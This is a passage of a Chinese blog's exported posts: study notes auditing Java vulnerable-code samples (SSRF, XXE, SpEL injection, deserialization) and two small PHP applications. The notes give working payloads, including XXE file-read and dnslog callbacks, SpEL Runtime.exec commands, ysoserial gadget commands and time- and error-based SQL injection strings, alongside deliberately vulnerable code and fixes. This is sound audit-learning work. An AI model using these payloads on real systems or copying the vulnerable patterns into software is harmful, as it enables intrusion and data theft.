&#125;\n\n获取url链接，通过openConnection打开链接，没有经过任何过滤。\n访问：http://localhost:8080/ssrf/urlConnection/vuln?url=http://baidu.com\n会跳转到baidu.com，所以ssrf没有先30x，就是url跳转漏洞\n常见利用方式就是探测内网资产结合redis写shell\n关键方法：URLConnection、openConnection、openStream、CloseableHttpAsyncClient\n\n修复：视频作者的修复是只允许http，https协议。但是这个也能用来探测内网资产。\npublic static boolean isHttp(String url) &#123;\n       return url.startsWith(&quot;http:&#x2F;&#x2F;&quot;) || url.startsWith(&quot;https:&#x2F;&#x2F;&quot;);\n   &#125;\n\n然后就是通过hook检查链接是否为内网资产。\n修复思路参考链接：https://blog.csdn.net/m0_67402118/article/details/125401069\nXXE：xxe支持protocol里的所有协议\nhttp，https， file，ftp，mailto，jar，netdoc\n\n利用和ssrf类似，探测内容，读取文件。同时还可以远程执行代码。\n有回显：DocumentBuilder：@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)\n   public String DocumentBuilderVuln01(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n           DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();\n           DocumentBuilder db &#x3D; dbf.newDocumentBuilder();\n           StringReader sr &#x3D; new StringReader(body);\n           InputSource is &#x3D; new InputSource(sr);\n           Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml\n\n           &#x2F;&#x2F; 遍历xml节点name和value\n           StringBuilder buf &#x3D; new StringBuilder();\n           NodeList rootNodeList &#x3D; document.getChildNodes();\n           for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;\n               Node rootNode &#x3D; rootNodeList.item(i);\n               NodeList child &#x3D; rootNode.getChildNodes();\n               for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;\n                   Node node &#x3D; child.item(j);\n                   buf.append(String.format(&quot;%s: %s\\n&quot;, node.getNodeName(), node.getTextContent()));\n               &#125;\n           &#125;\n           sr.close();\n           return buf.toString();\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n   &#125;\n\npayload：&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE creds [\n&lt;!ENTITY goodies SYSTEM\n&quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt;\n&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;\n\n无回显：xmlReader：@PostMapping(&quot;&#x2F;xmlReader&#x2F;vuln&quot;)\n   public String xmlReaderVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n           XMLReader xmlReader &#x3D; XMLReaderFactory.createXMLReader();\n           xmlReader.parse(new InputSource(new StringReader(body)));  &#x2F;&#x2F; parse xml\n           return &quot;xmlReader xxe vuln code&quot;;\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n   &#125;\n\npayload：借助dnslog平台\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n    &lt;!DOCTYPE ANY \n    [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;obfz0y.dnslog.cn&quot; &gt;]\n     &gt;\n     &lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;\n\nSAXBuilder：@RequestMapping(value &#x3D; &quot;&#x2F;SAXBuilder&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n    public String SAXBuilderVuln(HttpServletRequest request) &#123;\n        try &#123;\n            String body &#x3D; WebUtils.getRequestBody(request);\n            logger.info(body);\n\n            SAXBuilder builder &#x3D; new SAXBuilder();\n            &#x2F;&#x2F; org.jdom2.Document document\n            builder.build(new InputSource(new StringReader(body)));  &#x2F;&#x2F; cause xxe\n            return &quot;SAXBuilder xxe vuln code&quot;;\n        &#125; catch (Exception e) &#123;\n            logger.error(e.toString());\n            return EXCEPT;\n        &#125;\n    &#125;\n\nSAXPeader：&#x2F;&#x2F;&#x2F;&#x2F;saxReader是第三方的库，该类是无回显的\n   @RequestMapping(value &#x3D; &quot;&#x2F;SAXReader&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n   public String SAXReaderVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           SAXReader reader &#x3D; new SAXReader();\n           &#x2F;&#x2F; org.dom4j.Document document\n           reader.read(new InputSource(new StringReader(body))); &#x2F;&#x2F; cause xxe\n\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n\n       return &quot;SAXReader xxe vuln code&quot;;\n   &#125;\n\nSAXParser：&#x2F;&#x2F;该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台\n    @RequestMapping(value &#x3D; &quot;&#x2F;SAXParser&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n    public String SAXParserVuln(HttpServletRequest request) &#123;\n        try &#123;\n            String body &#x3D; WebUtils.getRequestBody(request);\n            logger.info(body);\n\n            SAXParserFactory spf &#x3D; SAXParserFactory.newInstance();\n            SAXParser parser &#x3D; spf.newSAXParser();\n            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  &#x2F;&#x2F; parse xml\n\n            return &quot;SAXParser xxe vuln code&quot;;\n        &#125; catch (Exception e) &#123;\n            logger.error(e.toString());\n            return EXCEPT;\n        &#125;\n    &#125;\n\nDigester：@RequestMapping(value &#x3D; &quot;&#x2F;Digester&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n   public String DigesterVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           Digester digester &#x3D; new Digester();\n           digester.parse(new StringReader(body));  &#x2F;&#x2F; parse xml\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n       return &quot;Digester xxe vuln code&quot;;\n   &#125;\n\n修复：@RequestMapping(value &#x3D; &quot;&#x2F;xmlReader&#x2F;sec&quot;, method &#x3D; RequestMethod.POST)\n   public String xmlReaderSec(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           XMLReader xmlReader &#x3D; XMLReaderFactory.createXMLReader();\n           &#x2F;&#x2F; fix code start\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;, true);\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;, false);\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;, false);\n           &#x2F;&#x2F;fix code end\n           xmlReader.parse(new InputSource(new StringReader(body)));  &#x2F;&#x2F; parse xml\n\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n\n       return &quot;xmlReader xxe security code&quot;;\n   &#125;\n\n通过这三行代码：\nxmlReader.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;, true);\nxmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;, false);\nxmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;, false);\n\nSPEL表达式注入：https://www.freebuf.com/articles/web/344140.html\nmaven导入：\n&lt;properties&gt;\n\t&lt;org.springframework.version&gt;5.0.8.RELEASE&lt;&#x2F;org.springframework.version&gt;\n&lt;&#x2F;properties&gt;\n\n&lt;dependency&gt;\n\t&lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;\n\t&lt;artifactId&gt;spring-expression&lt;&#x2F;artifactId&gt;\n\t&lt;version&gt;$&#123;org.springframework.version&#125;&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n利用条件：\n\n表达式未过滤，，或者过滤不严谨\n解析表达式后使用了getvalue/setvalue方法\n使用StandardEvaluationContext(默认)作为上下文对象\n\n漏洞代码：\n&#x2F;**\n     * SpEL to RCE\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;spel&#x2F;vul&#x2F;?expression&#x3D;xxx.\n     * xxx is urlencode(exp)\n     * exp: T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx.ceye.io&quot;)\n     *&#x2F;\n    @GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)\n    public String rce(String expression) &#123;\n        ExpressionParser parser &#x3D; new SpelExpressionParser();\n        &#x2F;&#x2F; fix method: SimpleEvaluationContext\n        Expression expression1 &#x3D; parser.parseExpression(expression);\n        Object obje &#x3D; expression1.getValue();\n        String obj_str &#x3D; obje.toString();\n        return obj_str;\n\t&#125;\n\n访问：http://localhost:8080/spel/vuln/?expression=T(java.lang.Runtime).getRuntime().exec(%22calc%22)\n即可弹出计算器\n关键字：org.springframework.expression.spel.standard\nexpression.setValue()\nexpression.getValue()\n\n修复：使用SimpleEvaluationContext替换StandardEvaluationContext\nSimpleEvaluationContext是StandardEvaluationContext的子集，这个表达式不包括Java类型引用，构造函数和bean引用。\nJava反序列化漏洞：这个漏洞就是Java漏洞的大头，很多严重的漏洞都是因为反序列化的时候没做好限制导致的。\n简单了解：漏洞代码：\n&#x2F;**\n* java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64\n* Add the result to rememberMe cookie.\n* &lt;p&gt;\n* http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln\n*&#x2F;\n@RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)\n    public String rememberMeVul(HttpServletRequest request)\n    throws IOException, ClassNotFoundException &#123;\n\n    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);\n\n    if (null &#x3D;&#x3D; cookie) &#123;\n        return &quot;No rememberMe cookie. Right?&quot;;\n    &#125;\n\n    String rememberMe &#x3D; cookie.getValue();\n    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);\n\n    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);\n    ObjectInputStream in &#x3D; new ObjectInputStream(bytes);\n    in.readObject();\n    in.close();\n\n    return &quot;Are u ok?&quot;;\n&#125;\n\n获取cookie中的rememberMe字段，先base64解码，之后直接反序列化\n利用就是使用yso生成cc5的链子\njava -jar ysoserial-all.jar CommonsCollections5 &quot;calc&quot; | base64\n\n之后就是填入cookie的rememberMe字段，没有就添加\n修复：使用RASP对代码hook，设置反序列化黑名单\n&#x2F;**\n     * Check deserialize class using black list.\n     * &lt;p&gt;\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;security\n     *&#x2F;\n    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)\n    public String rememberMeBlackClassCheck(HttpServletRequest request)\n            throws IOException, ClassNotFoundException &#123;\n\n        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);\n\n        if (null &#x3D;&#x3D; cookie) &#123;\n            return &quot;No rememberMe cookie. Right?&quot;;\n        &#125;\n        String rememberMe &#x3D; cookie.getValue();\n        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);\n\n        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);\n\n        try &#123;\n            AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException\n            in.readObject();\n            in.close();\n        &#125; catch (InvalidClassException e) &#123;\n            logger.info(e.toString());\n            return e.toString();\n        &#125;\n\n        return &quot;I&#39;m very OK.&quot;;\n    &#125;\n\n\n修复类就不列出来了\n反序列化太多了，知名的shiro、fastjson、weblogic、struts2等。还有Java原生反序列化利用链。等等。。。。。\n入门Java反序列化推荐代码审计星球里的教程\n小结：基本漏洞跟php没什么区别，就是框架不同。也就反序列化漏洞两种语言的特性有点不同。\n然后就是审计工具，fortify要收集一些最新的规则。\n","slug":"Java代码审计学习","date":"2022-12-09T10:29:21.000Z","categories_index":"代码审计","tags_index":"Java","author_index":"Longw"},{"id":"ca074290e7d8ca9fde2aa858e7b4cb94","title":"PHPCMS1.0审计","content":"\n\nhttps://github.com/harshitbansal373/PHP-CMS\nCREATE DATABASE cms DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;\nuse cms\nsource D:/cms.sql    导入sql文件\nharshitbansal  12345   账号密码\n好像不是官方版本，不管了，就这样\n官网：https://www.phpcmsv9.cn/\n文档可以下载\n开局报错，修改include/db.php里面的数据库配置\n开局没找到管理路径，尝试直接登录，数据库报错了，查看执行语句，发现是验证用户名，直接来个万能admin’ or 1=1#  发现单引号被转义了。。。\n使用的是mysqli_real_escape_string 来转义输入的字符集\nhttps://www.cnblogs.com/zhengna/p/12661170.html\n没有set name gbk，不能使用宽字节，那么就无解\n那么还是看一下入口文件和配置吧!\nindex.php引入includes/header.php\nheader.php包含db.php和mainPageFunctions.php\n这个mainPageFunctions.php就是一些常用的函数，其中有个email验证函数\nfunction email_exists($email)&#123;\n    global $connection;\n\n    $query &#x3D; &quot;SELECT user_email FROM users WHERE user_email &#x3D;&#39;$email&#39;&quot;;\n    $result &#x3D; mysqli_query($connection, $query);\n    confirm_query($result);\n\n    if(mysqli_num_rows($result)&gt;0)&#123;\n        return true;\n    &#125;else&#123;\n        return false;\n    &#125;\n\n&#125;\n\n通过刚才的过滤猜到应该是没有那种全局过滤的，所以找一下那里使用看这个函数\n在forget.php中找到\nforget.php   sql注入漏洞&lt;?php  include &quot;includes&#x2F;header.php&quot;; ?&gt;\n\n&lt;!-- Navigation --&gt;\n&lt;?php  include &quot;includes&#x2F;navigation.php&quot;; ?&gt;\n\n&lt;?php\n    \n    if(empty($_GET[&#39;forgot&#39;]))&#123;\n        redirect(&#39;index.php&#39;);\n    &#125;\n\n    if(isset($_POST[&#39;email&#39;]))&#123;\n        $email &#x3D; $_POST[&#39;email&#39;];\n        $length &#x3D; 50;\n        $token &#x3D; bin2hex(openssl_random_pseudo_bytes($length));\n\n        if(email_exists($email))&#123;\n\n没有过滤直接使用，但是包含了navigation.php。好像这个php文件没什么作用，暂时不管了\n试试正常的忘记密码流程，执行了sql语句，返回请输入正确的email id\n尝试直接注入，发现有前端email格式验证\n尝试抓包修改，之后查看sql语句\n不知道为什么没有执行sql语句，调式一下\n调式发现的确闭合了，并且执行到了mysql_query语句\n直接尝试时间注入payload：’ and if(ascii(substr(database(),1,1))&gt;114,sleep(3),null)# \n成功执行了语句\n\n直接在本地mysql命令行测试一下语句\nSELECT user_email FROM users WHERE user_email =‘&#x65;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#49;&#50;&#x33;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;‘and if(length(database())&gt;2,sleep(3),0)#’;\n​    -&gt; ;\n成功延时，这里的where注入必须要第一个结果是正确的，才能执行后面的语句，默认数据库有4个email，3个重复的&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#x65;&#64;&#103;&#x61;&#109;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;和1个&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#49;&#50;&#51;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#108;&#46;&#x63;&#111;&#x6d;，直接使用&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#49;&#x32;&#x33;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;就行，不然重复延时扛不住\n\n成功注入了，实战的时候也可以注册一个，注册不了就信息收集管理员邮箱测试就行了\n接下来就是写脚本注入，不进行了\n回到刚刚的index.php\n$query &#x3D; &quot;SELECT * FROM posts LIMIT $page_1 ,$per_page&quot;;\n$select_all_posts_query &#x3D; mysqli_query($connection,$query);\n\n直接拼接了，但是后面一个$per_page不可控，并且前一个$page_1，虽然是$_GET获取page再赋值，但是经过了数字计算，就不是可控的了\n$per_page &#x3D;4;\n\n        if(isset($_GET[&#39;page&#39;]))&#123;\n          $page &#x3D; $_GET[&#39;page&#39;];\n        &#125;else&#123;\n          $page &#x3D; &quot;&quot;;\n        &#125;\n\n        if($page &#x3D;&#x3D; 1 || $page &#x3D;&#x3D; &quot;&quot;)&#123;\n          $page_1 &#x3D; 0;\n        &#125;else&#123;\n          $page_1 &#x3D; ($page * $per_page) -$per_page;\n        &#125;\n\n输入page=aaa，结果得到page_1=-4是，所以跳过\n不过后面提取内容并且echo，可以尝试修改字段内容为xss，就能得到存储型xss\n$query &#x3D; &quot;SELECT * FROM posts LIMIT $page_1 ,$per_page&quot;;\n       $select_all_posts_query &#x3D; mysqli_query($connection,$query);\n       while($row &#x3D; mysqli_fetch_assoc($select_all_posts_query))&#123;\n           $post_id &#x3D; $row[&#39;post_id&#39;];\n           $post_title &#x3D; $row[&#39;post_title&#39;];\n           $post_user &#x3D; $row[&#39;post_user&#39;];\n           $post_date &#x3D; $row[&#39;post_date&#39;];\n           $post_image &#x3D; $row[&#39;post_image&#39;];\n           $post_content &#x3D; $row[&#39;post_content&#39;];\n     ?&gt;\n\n                 \n       &lt;!--first Blog Post --&gt;\n       &lt;h2&gt; \n         &lt;a href&#x3D;&quot;post.php?p_id&#x3D;&#39;&lt;?php echo $post_id; ?&gt;&#39;&quot;&gt;&lt;?php echo $post_title; ?&gt;&lt;&#x2F;a&gt;\n\n先看一下$post_id和$post_title是不是可控的\n全局搜索$post_title，没想到找到一个sql注入，第一个categorymenu.php中直接获取\n$_GET[‘category’]参数直接赋值给$post_category_id，之后直接带入数据库查询\ncategorymenu.php  category参数sql注入&lt;?php \n            if(isset($_GET[&#39;category&#39;]))&#123;\n                $post_category_id &#x3D; $_GET[&#39;category&#39;];\n            &#125;\n\n            $query &#x3D; &quot;SELECT * FROM posts WHERE post_category_id &#x3D; &#123;$post_category_id&#125; &quot;;\n            $select_all_posts_count_query &#x3D; mysqli_query($connection,$query);\n            $count &#x3D; mysqli_num_rows($select_all_posts_count_query);\n\n直接尝试一下\n直接访问：[http://phpcms:8086/categorymenu.php?category=3%20and%20if(length(database())%3E2,sleep(1),0)#](http://phpcms:8086/categorymenu.php?category=3 and if(length(database())&gt;2,sleep(1),0)#)\n可以看到延时了两秒，因为有两个id为3的数据\n\n回到刚刚的index.php查$post_title，还是查找update和insert语句看看\n再edit_post.php中找到一句\nincludes/edit_post.phpnmd，上来一个sql注入\n&lt;?php\nif(isset($_GET[&#39;p_id&#39;]))&#123;\n    $the_post_id &#x3D; $_GET[&#39;p_id&#39;];\n&#125;\n$query &#x3D; &quot;SELECT * FROM posts WHERE post_id &#x3D; &#123;$the_post_id&#125;&quot;;\n    $select_posts_by_id &#x3D; mysqli_query($connection,$query);\n\n和上一个一模一样，先不看了，找那个xss去\nif(isset($_POST[&#39;update_post&#39;]))&#123;\n    $post_title &#x3D; $_POST[&#39;post_title&#39;];\n    $post_category_id &#x3D; $_POST[&#39;post_category_id&#39;];\n    $post_status &#x3D; $_POST[&#39;post_status&#39;];\n\n    $post_image &#x3D; $_FILES[&#39;post_image&#39;][&#39;name&#39;];\n    $post_temp_image &#x3D; $_FILES[&#39;post_image&#39;][&#39;tmp_name&#39;];\n    \n    $post_tags &#x3D; $_POST[&#39;post_tags&#39;];\n    $post_content &#x3D; $_POST[&#39;post_content&#39;];\n    $post_date &#x3D; date(&#39;d-m-y&#39;);\n\n    $location &#x3D; &quot;..&#x2F;images&#x2F;$post_image&quot;;\n    move_uploaded_file($post_temp_image,$location);\n\n    if(empty($post_image))&#123;\n        $query &#x3D; &quot;SELECT * FROM posts WHERE post_id &#x3D; &#39;&#123;$the_post_id&#125;&#39; &quot;;\n        $set_image &#x3D; mysqli_query($connection,$query);\n\n        while($row &#x3D; mysqli_fetch_assoc($set_image))&#123;\n        $post_image &#x3D; $row[&#39;post_image&#39;];\n        &#125;\n    &#125;\n\n    $query &#x3D; &quot;UPDATE posts SET post_title &#x3D; &#39;&#123;$post_title&#125;&#39;, post_category_id &#x3D; &#39;&#123;$post_category_id&#125;&#39;, \n            post_status &#x3D; &#39;&#123;$post_status&#125;&#39;, post_image &#x3D; &#39;&#123;$post_image&#125;&#39;, post_tags &#x3D; &#39;&#123;$post_tags&#125;&#39;, \n            post_content &#x3D; &#39;&#123;$post_content&#125;&#39;, post_date &#x3D; NOW() WHERE post_id &#x3D; ?&quot;;\n\n    $stmt_update_post &#x3D; mysqli_prepare($connection,$query);\n    mysqli_stmt_bind_param($stmt_update_post, &quot;s&quot;, $the_post_id);\n    mysqli_stmt_execute($stmt_update_post);\n    mysqli_stmt_close($stmt_update_post);\n\n可以看到，通过post接收传入的参数，之后直接插入sql语句，虽然那个where后面的post_id经过了数据库预编译\n预编译了个寂寞，前面两处使用post_id查询都没有预编译，就是后面update的时候使用了\n看了一下，访问该文件需要进行登录，先注册一个账号，注册发现报错，有一个函数password_hash需要php5.5.0，所以更换一下php的版本，再进行注册\n注册了，也执行了sql语句，但是为什么没有插入数据库\n本地命令行测试，发现有一个字段没有默认值，也就是说这个版本压根不能进行注册\n又是个残缺的，不审了\n搜了一下命令执行的函数，没有就直接不弄了\n吐槽老版本的cms的确漏洞百出，但是使用的技术大多过时。虽然漏洞原理一样，但是审计新版带框架的cms难度总是大一点的。后面还是找一点使用了thinkphp框架的老版本cms审计审计。\nJavacms也要开始练了\n","slug":"PHPCMS1-0审计","date":"2022-12-05T11:31:46.000Z","categories_index":"代码审计","tags_index":"PHP","author_index":"Longw"},{"id":"8a76ff70cc47792edc7663e7a400be26","title":"冰心网络验证平台3.1审计或漏洞复现","content":"\n\nCREATE DATABASE &#96;BX&#96; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;\n\nadmin  admin\n审计资料：\nhttps://zone.huoxian.cn/d/1177\nhttps://forum.butian.net/share/1206\n官方文档：https://www.kancloud.cn/li1446458045/wlyz/331886\n通过正则匹配sql注入点：\n$this-&gt;con(.*?){$\n这个结果后面看参考资料验证，关键这个正则也不对啊！结果还是有单引号\n使用easy扫描才27个结果，后面可以一个一个的看\n代码量不多，现在试试审计前台\n目录结构：app目录：用来存放视图控制器模型等。\n\nconfig目录：用来存放框架的一些公共配置文件。\n\ncore目录：用来存放一些基类文件，例如：控制器基类、模型基类、视图基类、request请求基类、\ndb链式操作基类等。\n\npublic\\static目录：用来存放一些静态资源，例如：图片、html视图文件、js、cs文件等。\n\nindex.php：整个框架的入口文件，进行分发启动。\n\nindex.php包含core\\common.php\n这个php文件被加密了，我尝试自己解密，发现太麻烦老是有问题。直接搜索发现在GitHub上有这个版本的直接解密版。直接用解密版的审计，解密等审计完有空再弄弄。\ncore\\common.php使用core\\lib\\Config.php、core\\lib\\Route.php\nconfig.php中只有一个类的get和set方法\nroute.php就是路由类了，也没什么东西，后面有用再看\n包含了core\\lib\\Load.php，用来包含php文件的类\n又通过一个php文件包含了core\\function\\function.php，里面是一些方法\n接下来马上过滤$_GET，是数组就通过array_map过滤\n$_POST、$_COOKIE、$_REQUEST也都用addslashes函数过滤一遍\nif (!get_magic_quotes_gpc()) &#123;&#x2F;&#x2F;始终返回false\n    if (!empty($_GET)) &#123;\n        $_GET &#x3D; addslashes_deep($_GET);\n    &#125;\n    if (!empty($_POST)) &#123;\n        $_POST &#x3D; addslashes_deep($_POST);\n    &#125;\n    $_COOKIE &#x3D; addslashes_deep($_COOKIE);\n    $_REQUEST &#x3D; addslashes_deep($_REQUEST);\n&#125;\n\n\n\nfunction addslashes_deep($value) &#123;\n\tif (empty($value)) &#123;\n\t\treturn $value;\n\t&#125; else &#123;\n\t\treturn is_array($value) ? array_map(&#39;addslashes_deep&#39;, $value) : addslashes($value);\n\t&#125;\n&#125;\n\n后面就是初始化路由，看app目录了。\nSQL注入第一次碰见这种服务端客户端结合的。看官方文档的api接口，第一个获取服务器信息的接口\n发送数据试试，没想到sql语句报错了。。。。。\nSoftware.php-&gt;getinfo   sql注入\nid为数字时，返回的是404表示软件不存在，换了几个常见数字一直返回404，换成字母，发现sql语句报错了，但是前面index.php有全局转义，只能用数字型的注入试试\n看一下代码\npublic function getInfo() &#123;\n  do_action(&#39;api_software_sw&#39;);\n  $res[&#39;version&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;version&#39;];\n  $res[&#39;notice&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;notice&#39;];\n  $res[&#39;update_data&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;update_data&#39;];\n  $res[&#39;update_type&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;update_type&#39;];\n  $res[&#39;static_data&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;static_data&#39;];\n  $res[&#39;trial_interval&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;trial_interval&#39;];\n  $res[&#39;software_state&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;software_state&#39;];\n  $res[&#39;bindingdel_type&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;bindingdel_type&#39;];\n  exit(api_json(&#39;1&#39;,$res));\n&#125;\n\n不是太明白，不过应该就是获取系统信息，最后输出的流程，为什么会有sql语句报错呢？不是太懂，动态调式看下处理流程是怎么回事。\n这个断点还得下再入口文件index.php上，要不然不能断掉\n不咋会调式，调了一遍，没找到sql语句的执行点，真菜啊！！！！\n直接用sql监控查看执行的sql语句\n\n语句为：select SELECT * FROM BX_software where id=adada;\n数字型的注入，再本地的cmd中用mysql测试发现\nid为数字，并且404表示的是数据库返回了空的结果\n接下来就是正常的注入流程了：\n直接报错注入\nid=1+and+(updatexml(1,concat(0x7e,(select+user()),0x7e),1))&amp;data=2\n\n不过，这种也不算是代码审计了。。。。。。\n后面再来调试看看！找到语句再分析原理吧！\n再看了一下代码，找到语句了，再common.php中。software继承了common并且实列化了。在调用init方法时就会触发sql注入漏洞：\nclass Software extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;\n\nprotected function init() &#123;\n\t\trequire BX_ROOT . &#39;app&#x2F;api&#x2F;api_function.php&#39;;\n\t\t$id &#x3D; !empty($_POST[&#39;id&#39;]) ? $_POST[&#39;id&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$data &#x3D; !empty($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$this-&gt;con &#x3D; Db::getInstance();\n\t\t$this-&gt;software &#x3D; $this-&gt;con-&gt;select(&#39;software&#39;,&quot;id&#x3D;&#123;$id&#125;&quot;);\n\t\tif(!$this-&gt;software) &#123;\n\t\t\texit(api_json(&#39;404&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\t$this-&gt;isBlackIp();\n\t\t$this-&gt;log &#x3D; new InsertLog($this-&gt;software[&#39;0&#39;][&#39;id&#39;]);\n\t\tdefine(&#39;API_ENCRYPT&#39;,$this-&gt;software[&#39;0&#39;][&#39;encrypt&#39;]);\n\t\tdefine(&#39;API_KEY&#39;,$this-&gt;software[&#39;0&#39;][&#39;s_key&#39;]);\n\t\tif(API_ENCRYPT &#x3D;&#x3D; &#39;defined_encrypt&#39;) &#123;\n\t\t\teval($this-&gt;software[&#39;0&#39;][&#39;defined_encrypt&#39;]);\n\t\t&#125;\n\t\t$this-&gt;data &#x3D; bx_decrypt($data,API_KEY,API_ENCRYPT);\n\t\tif(!$this-&gt;data) &#123;\n\t\t\texit(api_json(&#39;444&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\tif($this-&gt;getState() &#x3D;&#x3D; &#39;2&#39;) &#123;\n\t\t\texit(api_json(&#39;403&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\tdo_action(&#39;api_common&#39;);\n\t&#125;\n\n接收了$_POST[‘id’]的传参，并用select方法查询：\npublic function select($table,$where &#x3D; &#39;&#39;, $join &#x3D; &#39;&#39;, $desc &#x3D; &#39;&#39;, $limit &#x3D; &#39;&#39;,$field &#x3D; &#39;&#39;) &#123;\n\t\ttry &#123;\n\t\t\t$ifwhere &#x3D; &#39;&#39;;\n\t\t\t$order &#x3D; &#39;&#39;;\n\t\t\t$desc_limit &#x3D; &#39;&#39;;\n\t\t\tif (! empty($where)) &#123;\n\t\t\t\t$ifwhere &#x3D; &quot;where &#123;$where&#125;&quot;;\n\t\t\t&#125;\n\t\t\tif (! empty($desc)) &#123;\n\t\t\t\t$order &#x3D; &quot;order by &#123;$desc&#125; desc&quot;;\n\t\t\t&#125;\n\t\t\tif (! empty($limit)) &#123;\n\t\t\t\t$desc_limit &#x3D; &quot;limit &#123;$limit&#125;&quot;;\n\t\t\t&#125;\n\t\t\tempty($field) ? $field &#x3D; &quot;*&quot; : FALSE;\n\t\t\t$sql &#x3D; &quot;SELECT &#123;$field&#125; FROM &#123;$this -&gt; pre&#125;&#123;$table&#125; &#123;$join&#125; &#123;$ifwhere&#125; &#123;$order&#125; &#123;$desc_limit&#125;&quot;;\n\t\t\t$sql &#x3D; str_replace(&#39;pre_&#39;,$this -&gt; pre, $sql);\n\t\t\t$Model &#x3D; $this-&gt;server-&gt;prepare($sql);\n\t\t\t$Model-&gt;execute();\n\t\t\t$m_data &#x3D; 